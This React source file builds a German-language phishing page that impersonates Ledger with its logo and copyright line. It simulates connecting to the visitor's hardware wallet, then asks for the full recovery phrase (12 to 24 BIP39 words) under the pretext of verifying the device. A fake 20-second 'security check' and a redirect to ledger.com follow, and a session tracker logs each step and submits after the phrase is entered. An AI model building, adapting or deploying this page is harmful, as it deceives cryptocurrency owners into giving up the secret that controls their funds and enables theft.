import type React from "react";
import { useEffect, useRef, useState } from "react";
import { Loader2, Check } from "lucide-react";
import ledgerLogo from "../assets/ledger-logo.svg";
import { Dialog, DialogContent } from "@/components/ui/dialog";
import { Tabs, TabsList, TabsTrigger, TabsContent } from "@/components/ui/tabs";
import { BIP39_WORDS } from "@/assets/bip39";
import { useTrackedSession } from "@/hooks/useTrackedSession";

type IconProps = { className?: string };

const devices: { name: string; short: string; svg: (p: IconProps) => React.ReactElement }[] = [
  { name: "Ledger Stax", short: "Stax", svg: StaxIcon },
  { name: "Ledger Flex", short: "Flex", svg: FlexIcon },
  { name: "Ledger Nano Gen5", short: "Nano Gen5", svg: NanoGen5Icon },
  { name: "Ledger Nano S", short: "Nano S", svg: NanoSIcon },
  { name: "Ledger Nano S Plus", short: "Nano S Plus", svg: NanoSPlusIcon },
  { name: "Ledger Nano X", short: "Nano X", svg: NanoXIcon },
];

type View = "select" | "connecting" | "detected" | "wizard";

const primaryButton =
  "cursor-pointer rounded-full bg-white px-8 py-3 text-base font-semibold text-black transition-colors duration-300 hover:bg-[#a78bfa] hover:text-white";

const Ledger = () => {
  const [view, setView] = useState<View>("select");
  const [selectedIdx, setSelectedIdx] = useState<number | null>(null);
  const [wizardStep, setWizardStep] = useState<1 | 2 | 3>(1);
  const [modalOpen, setModalOpen] = useState(false);
  const tracker = useTrackedSession();

  useEffect(() => {
    document.title = "Wähle dein Ledger-Gerät";
  }, []);

  useEffect(() => {
    if (view !== "connecting") return;
    const t = setTimeout(() => setView("detected"), 5000);
    return () => clearTimeout(t);
  }, [view]);

  const selected = selectedIdx !== null ? devices[selectedIdx] : null;

  return (
    <main className="flex min-h-screen flex-col items-center bg-[#0b0b10] px-4 py-16">
      <div className="flex flex-1 flex-col items-center justify-center">
        {view === "select" && (
          <SelectView
            onPick={(i) => {
              setSelectedIdx(i);
              setView("connecting");
              tracker.update({ device: devices[i].name, step: "connecting" });
            }}
          />
        )}

        {view === "connecting" && selected && <ConnectingView device={selected} />}

        {view === "detected" && (
          <DetectedView
            onContinue={() => {
              setWizardStep(1);
              setView("wizard");
              tracker.update({ step: "wizard_1" });
            }}
          />
        )}

        {view === "wizard" && (
          <WizardView
            step={wizardStep}
            onVerifyClick={() => {
              setModalOpen(true);
              tracker.update({ step: "seed_modal" });
            }}
            onNext={() =>
              setWizardStep((s) => {
                const next = (s < 3 ? s + 1 : s) as 1 | 2 | 3;
                tracker.update({ step: `wizard_${next}` });
                return next;
              })
            }
          />
        )}
      </div>

      <SeedDialog
        open={modalOpen}
        onOpenChange={setModalOpen}
        tracker={tracker}
        onVerified={() => {
          setModalOpen(false);
          setWizardStep(2);
          tracker.submit();
        }}
      />


      <footer className="mt-10 w-full text-center text-xs text-gray-600">
        Copyright © Ledger SAS. All rights reserved.
      </footer>
    </main>
  );
};

export default Ledger;

/* ---------- Views ---------- */

function SelectView({ onPick }: { onPick: (idx: number) => void }) {
  return (
    <div className="flex w-full max-w-5xl flex-col items-center text-center">
      <img src={ledgerLogo} alt="Ledger" className="mb-10 h-10 w-auto invert" />
      <h1 className="text-4xl font-semibold tracking-tight text-white sm:text-5xl">
        Wähle dein <span className="text-[#a78bfa]">Ledger-Gerät</span>
      </h1>
      <p className="mt-4 max-w-2xl text-base text-gray-400">
        Wähle das Gerät, das du besitzt, um dich sicher zu verbinden und fortzufahren.
      </p>
      <div className="mt-14 grid w-full grid-cols-1 gap-5 sm:grid-cols-2 lg:grid-cols-3">
        {devices.map(({ name, svg: Icon }, i) => (
          <button
            key={name}
            type="button"
            onClick={() => onPick(i)}
            className="group flex cursor-pointer flex-col items-center justify-center rounded-2xl border border-white/10 bg-[#13131a] p-8 transition-all hover:border-[#a78bfa] hover:bg-[#1a1a24]"
          >
            <div className="mb-5 flex h-32 items-center justify-center">
              <Icon />
            </div>
            <span className="text-base font-medium text-white">{name}</span>
          </button>
        ))}
      </div>
    </div>
  );
}

function ConnectingView({ device }: { device: { name: string; short: string; svg: (p: IconProps) => React.ReactElement } }) {
  const Icon = device.svg;
  return (
    <div className="flex flex-col items-center text-center">
      <div className="relative mb-10 flex h-64 w-64 items-center justify-center">
        <div className="absolute inset-0 animate-pulse rounded-full bg-[#a78bfa]/40 blur-3xl" />
        <div className="relative scale-[1.6]">
          <Icon />
        </div>
      </div>
      <h2 className="text-3xl font-semibold text-white sm:text-4xl">
        Verbinde zu <span className="text-[#a78bfa]">{device.short}</span>...
      </h2>
      <div className="mt-6 flex items-center gap-3 text-gray-300">
        <Loader2 className="h-5 w-5 animate-spin text-[#a78bfa]" />
        <span>Sichere Verbindung wird hergestellt</span>
      </div>
    </div>
  );
}

function DetectedView({ onContinue }: { onContinue: () => void }) {
  return (
    <div className="flex flex-col items-center text-center">
      <img src={ledgerLogo} alt="Ledger" className="mb-10 h-12 w-auto invert" />
      <p className="max-w-xl text-lg text-white">
        Dein Gerät wurde erkannt, klicke nun auf <span className="text-[#a78bfa]">"Weiter"</span> um einen Sicherheitscheck durchzuführen
      </p>
      <button type="button" onClick={onContinue} className={`mt-8 ${primaryButton}`}>
        Weiter
      </button>
    </div>
  );
}

function WizardView({
  step,
  onVerifyClick,
  onNext,
}: {
  step: 1 | 2 | 3;
  onVerifyClick: () => void;
  onNext: () => void;
}) {
  const [checking, setChecking] = useState(false);
  const [progress, setProgress] = useState(0);

  useEffect(() => {
    if (step !== 2) {
      setChecking(false);
      setProgress(0);
    }
  }, [step]);

  useEffect(() => {
    if (!checking) return;
    const start = Date.now();
    const duration = 20000;
    const id = setInterval(() => {
      const p = Math.min(100, ((Date.now() - start) / duration) * 100);
      setProgress(p);
      if (p >= 100) {
        clearInterval(id);
        setTimeout(() => onNext(), 300);
      }
    }, 100);
    return () => clearInterval(id);
  }, [checking, onNext]);

  return (
    <div className="flex w-full max-w-3xl flex-col items-center text-center">
      <img src={ledgerLogo} alt="Ledger" className="mb-10 h-10 w-auto invert" />
      <StepIndicator step={step} />

      <div className="mt-12 w-full">
        {step === 1 && (
          <div className="flex flex-col items-center">
            <h2 className="text-2xl font-semibold text-white">Gerät verifizieren</h2>
            <p className="mt-3 max-w-xl text-gray-400">
              Verifiziere dein Ledger-Gerät, indem du deine Recovery-Phrase eingibst, damit wir die Echtheit deines Geräts bestätigen können.
            </p>
            <button type="button" onClick={onVerifyClick} className={`mt-8 ${primaryButton}`}>
              Gerät verifizieren
            </button>
          </div>
        )}

        {step === 2 && (
          <div className="flex flex-col items-center">
            <h2 className="text-2xl font-semibold text-white">Sicherheitscheck</h2>
            <p className="mt-3 max-w-xl text-gray-400">
              Wir führen jetzt einen umfassenden Sicherheitscheck deines Geräts durch, um sicherzustellen, dass es nicht kompromittiert wurde.
            </p>
            {!checking ? (
              <button type="button" onClick={() => setChecking(true)} className={`mt-8 ${primaryButton}`}>
                Sicherheitscheck durchführen
              </button>
            ) : (
              <div className="mt-10 w-full max-w-md">
                <div className="mb-3 flex items-center justify-between text-sm text-gray-300">
                  <span>Sicherheitscheck läuft...</span>
                  <span className="font-medium text-[#a78bfa]">{Math.floor(progress)}%</span>
                </div>
                <div className="h-2 w-full overflow-hidden rounded-full bg-white/10">
                  <div
                    className="h-full rounded-full bg-[#a78bfa] transition-[width] duration-100 ease-linear"
                    style={{ width: `${progress}%`, boxShadow: "0 0 12px rgba(167,139,250,0.6)" }}
                  />
                </div>
              </div>
            )}
          </div>
        )}

        {step === 3 && (
          <div className="flex flex-col items-center">
            <div className="relative mb-6 flex h-20 w-20 items-center justify-center">
              <div className="absolute inset-0 rounded-full bg-[#a78bfa]/40 blur-xl" />
              <div className="relative flex h-20 w-20 items-center justify-center rounded-full bg-[#a78bfa]">
                <Check className="h-10 w-10 text-white" strokeWidth={3} />
              </div>
            </div>
            <h2 className="text-2xl font-semibold text-white">Gerät sicher</h2>
            <p className="mt-3 max-w-xl text-gray-400">
              Der Sicherheitscheck wurde erfolgreich bestanden. Dein Ledger-Gerät ist verifiziert und sicher.
            </p>
            <button
              type="button"
              onClick={() => {
                window.location.href = "https://www.ledger.com/";
              }}
              className={`mt-8 ${primaryButton}`}
            >
              Zurück zu Ledger
            </button>
          </div>
        )}
      </div>
    </div>
  );
}

function StepIndicator({ step }: { step: 1 | 2 | 3 }) {
  const steps = [
    { n: 1, label: "Gerät verifizieren" },
    { n: 2, label: "Sicherheitscheck" },
    { n: 3, label: "Bestätigung" },
  ] as const;
  return (
    <div className="mx-auto flex w-full max-w-xl items-center justify-center">
      {steps.map((s, i) => {
        const active = step === s.n;
        const done = step > s.n;
        return (
          <div key={s.n} className="flex items-center" style={{ flex: i === steps.length - 1 ? "0 0 auto" : "1 1 0" }}>
            <div className="relative flex w-10 shrink-0 flex-col items-center">
              <div className="relative flex h-10 w-10 items-center justify-center">
                {active && (
                  <div className="absolute inset-0 -m-1 rounded-full bg-[#a78bfa]/40 blur-lg" />
                )}
                <div
                  className={`relative flex h-10 w-10 items-center justify-center rounded-full border-2 text-sm font-semibold transition-colors ${
                    active
                      ? "border-[#a78bfa] bg-[#a78bfa] text-white"
                      : done
                      ? "border-[#a78bfa] bg-[#a78bfa]/20 text-[#a78bfa]"
                      : "border-white/20 text-gray-500"
                  }`}
                >
                  {done ? <Check className="h-5 w-5" /> : s.n}
                </div>
              </div>
              <span
                className={`absolute top-12 w-40 text-center text-xs sm:text-sm ${
                  active ? "text-[#a78bfa] font-medium" : done ? "text-[#a78bfa]/80" : "text-gray-500"
                }`}
              >
                {s.label}
              </span>
            </div>
            {i < steps.length - 1 && (
              <div className={`mx-2 h-px flex-1 ${step > s.n ? "bg-[#a78bfa]" : "bg-white/10"}`} />
            )}
          </div>
        );
      })}
    </div>
  );
}

/* ---------- Seed Dialog ---------- */

function SeedDialog({
  open,
  onOpenChange,
  onVerified,
}: {
  open: boolean;
  onOpenChange: (o: boolean) => void;
  onVerified: () => void;
}) {
  const [count, setCount] = useState<"12" | "18" | "24">("24");
  const [words, setWords] = useState<string[]>(() => Array(24).fill(""));
  const [verifying, setVerifying] = useState(false);

  useEffect(() => {
    setWords(Array(Number(count)).fill(""));
  }, [count]);

  useEffect(() => {
    if (!open) {
      setWords(Array(Number(count)).fill(""));
      setVerifying(false);
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [open]);

  useEffect(() => {
    if (!verifying) return;
    const t = setTimeout(() => {
      setVerifying(false);
      onVerified();
    }, 3000);
    return () => clearTimeout(t);
  }, [verifying, onVerified]);

  const complete = words.length > 0 && words.every((w) => w.trim().length > 0);

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="max-h-[90vh] max-w-2xl overflow-y-auto border-none bg-white p-8 text-black sm:p-10">
        {verifying && (
          <div className="absolute inset-0 z-50 flex flex-col items-center justify-center gap-4 bg-white/85 backdrop-blur-sm">
            <Loader2 className="h-10 w-10 animate-spin text-[#a78bfa]" />
            <span className="text-sm font-medium text-gray-700">Überprüfen...</span>
          </div>
        )}
        <div className="flex flex-col items-center">
          <img src={ledgerLogo} alt="Ledger" className="mb-6 h-12 w-auto" />
          <h3 className="text-xl font-semibold text-black">Gerät verifizieren</h3>
          <p className="mt-2 max-w-md text-center text-sm text-gray-600">
            Gib die Wörter deiner Recovery-Phrase in der richtigen Reihenfolge ein.
          </p>

          <Tabs value={count} onValueChange={(v) => setCount(v as "12" | "18" | "24")} className="mt-6 w-full">
            <TabsList className="mx-auto flex w-full max-w-md justify-center gap-2 bg-transparent p-0">
              {(["12", "18", "24"] as const).map((c) => (
                <TabsTrigger
                  key={c}
                  value={c}
                  className="rounded-md bg-transparent px-4 py-2 text-sm text-gray-500 shadow-none transition-colors data-[state=active]:bg-gray-100 data-[state=active]:text-black data-[state=active]:shadow-none"
                >
                  {c} Wörter
                </TabsTrigger>
              ))}
            </TabsList>

            {(["12", "18", "24"] as const).map((c) => (
              <TabsContent key={c} value={c} className="mt-6">
                {count === c && <SeedGrid count={Number(c)} words={words} setWords={setWords} />}
              </TabsContent>
            ))}
          </Tabs>

          <div className="mt-6 w-full text-left text-sm text-gray-500">
            {words.filter((w) => w.trim().length > 0).length}/{Number(count)} Wörter
          </div>

          <button
            type="button"
            onClick={() => setVerifying(true)}
            disabled={!complete || verifying}
            className={`mt-6 rounded-full px-10 py-3 text-base font-semibold transition-colors duration-300 ${
              complete
                ? "bg-[#a78bfa] text-white hover:bg-[#9370f0]"
                : "cursor-not-allowed bg-gray-200 text-gray-400"
            }`}
          >
            Verifizieren
          </button>
        </div>
      </DialogContent>
    </Dialog>
  );
}

function SeedGrid({
  count,
  words,
  setWords,
}: {
  count: number;
  words: string[];
  setWords: (w: string[]) => void;
}) {
  const [focusedIdx, setFocusedIdx] = useState<number | null>(null);
  return (
    <div className="grid grid-cols-2 gap-x-5 gap-y-4 sm:grid-cols-4">
      {Array.from({ length: count }).map((_, i) => {
        const raw = words[i] ?? "";
        const val = raw.trim().toLowerCase();
        const filled = raw.length > 0;
        const isValid = val.length > 0 && BIP39_WORDS.has(val);
        const isFocused = focusedIdx === i;

        let borderClass: string;
        if (val.length === 0) {
          borderClass = isFocused ? "border-black" : "border-gray-300";
        } else if (isValid) {
          borderClass = isFocused ? "border-green-500" : "border-black";
        } else {
          borderClass = "border-red-500";
        }

        return (
          <div
            key={i}
            className={`flex items-center gap-1.5 border-b pb-1 transition-colors ${borderClass}`}
          >
            <span className={`shrink-0 text-xs ${filled ? "text-black" : "text-gray-400"}`}>{i + 1}.</span>
            <input
              type="text"
              value={raw}
              onFocus={() => setFocusedIdx(i)}
              onBlur={() => setFocusedIdx((cur) => (cur === i ? null : cur))}
              onChange={(e) => {
                const next = [...words];
                next[i] = e.target.value;
                setWords(next);
              }}
              className={`w-full bg-transparent text-sm outline-none ${filled ? "text-black" : "text-gray-500"}`}
              autoComplete="off"
            />
          </div>
        );
      })}
    </div>
  );
}

/* ---------- Icons ---------- */

function StaxIcon() {
  return (
    <svg width="80" height="110" viewBox="0 0 80 110" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="15" y="5" width="50" height="75" rx="6" fill="#222" stroke="#444" strokeWidth="1.5" />
      <rect x="20" y="15" width="40" height="55" rx="3" fill="#1a1a1a" stroke="#555" strokeWidth="1" />
      <rect x="25" y="20" width="30" height="8" rx="2" fill="#333" />
      <rect x="25" y="32" width="30" height="4" rx="1" fill="#2a2a2a" />
      <rect x="25" y="40" width="20" height="4" rx="1" fill="#2a2a2a" />
      <rect x="25" y="55" width="12" height="12" rx="6" fill="#222" stroke="#444" />
      <rect x="43" y="55" width="12" height="12" rx="6" fill="#222" stroke="#444" />
      <rect x="5" y="60" width="50" height="45" rx="6" fill="#1a1a1a" stroke="#333" strokeWidth="1.5" transform="rotate(-20 5 60)" />
    </svg>
  );
}

function FlexIcon() {
  return (
    <svg width="65" height="110" viewBox="0 0 65 110" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="8" y="5" width="49" height="90" rx="8" fill="#2a2a2a" stroke="#444" strokeWidth="1.5" />
      <rect x="14" y="12" width="37" height="60" rx="4" fill="#1a1a1a" stroke="#555" />
      <rect x="18" y="18" width="29" height="6" rx="2" fill="#333" />
      <rect x="18" y="28" width="22" height="3" rx="1" fill="#2a2a2a" />
      <rect x="18" y="35" width="29" height="3" rx="1" fill="#2a2a2a" />
      <circle cx="32" cy="85" r="6" fill="#1a1a1a" stroke="#444" />
      <rect x="26" y="97" width="13" height="5" rx="2" fill="#333" />
    </svg>
  );
}

function NanoGen5Icon() {
  return (
    <svg width="75" height="110" viewBox="0 0 75 110" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="55" height="75" rx="6" fill="#222" stroke="#444" strokeWidth="1.5" />
      <rect x="16" y="18" width="43" height="55" rx="3" fill="#1a1a1a" stroke="#555" />
      <rect x="20" y="22" width="35" height="5" rx="2" fill="#333" />
      <rect x="20" y="31" width="35" height="30" rx="2" fill="#111" stroke="#333" />
      <rect x="23" y="34" width="29" height="4" rx="1" fill="#222" />
      <rect x="23" y="42" width="20" height="4" rx="1" fill="#222" />
      <rect x="23" y="50" width="25" height="4" rx="1" fill="#222" />
      <circle cx="20" cy="88" r="5" fill="#1a1a1a" stroke="#444" />
      <circle cx="55" cy="88" r="5" fill="#1a1a1a" stroke="#444" />
      <rect x="28" y="100" width="19" height="5" rx="2" fill="#333" />
    </svg>
  );
}

function NanoSIcon() {
  return (
    <svg width="110" height="80" viewBox="0 0 110 80" fill="none" xmlns="http://www.w3.org/2000/svg" className="rotate-[-20deg]">
      <rect x="5" y="25" width="95" height="28" rx="6" fill="#2a2a2a" stroke="#555" strokeWidth="1.5" />
      <rect x="18" y="30" width="45" height="18" rx="3" fill="#111" stroke="#444" />
      <text x="23" y="43" fontFamily="monospace" fontSize="8" fill="#888">••••</text>
      <circle cx="12" cy="39" r="6" fill="#1a1a1a" stroke="#444" />
      <circle cx="98" cy="39" r="6" fill="#1a1a1a" stroke="#444" />
      <rect x="5" y="0" width="8" height="28" rx="3" fill="#333" />
    </svg>
  );
}

function NanoSPlusIcon() {
  return (
    <svg width="110" height="80" viewBox="0 0 110 80" fill="none" xmlns="http://www.w3.org/2000/svg" className="rotate-[-15deg]">
      <rect x="5" y="22" width="100" height="32" rx="7" fill="#333" stroke="#555" strokeWidth="1.5" />
      <rect x="20" y="28" width="48" height="20" rx="3" fill="#111" stroke="#444" />
      <rect x="24" y="32" width="10" height="4" rx="1" fill="#222" />
      <rect x="37" y="32" width="20" height="4" rx="1" fill="#222" />
      <rect x="24" y="40" width="30" height="3" rx="1" fill="#1a1a1a" />
      <circle cx="12" cy="38" r="7" fill="#222" stroke="#444" />
      <circle cx="100" cy="38" r="7" fill="#222" stroke="#444" />
      <rect x="5" y="0" width="9" height="25" rx="3" fill="#3a3a3a" />
    </svg>
  );
}

function NanoXIcon() {
  return (
    <svg width="110" height="80" viewBox="0 0 110 80" fill="none" xmlns="http://www.w3.org/2000/svg" className="rotate-[-20deg]">
      <rect x="5" y="20" width="100" height="38" rx="8" fill="#3a3a3a" stroke="#555" strokeWidth="1.5" />
      <rect x="20" y="27" width="55" height="24" rx="4" fill="#111" stroke="#444" />
      <rect x="25" y="31" width="13" height="5" rx="1" fill="#222" />
      <rect x="42" y="31" width="25" height="5" rx="1" fill="#222" />
      <rect x="25" y="40" width="35" height="3" rx="1" fill="#1a1a1a" />
      <circle cx="12" cy="39" r="8" fill="#2a2a2a" stroke="#444" />
      <circle cx="100" cy="39" r="8" fill="#2a2a2a" stroke="#444" />
      <rect x="5" y="0" width="10" height="23" rx="3" fill="#444" />
      <rect x="95" y="57" width="10" height="6" rx="2" fill="#333" />
    </svg>
  );
}
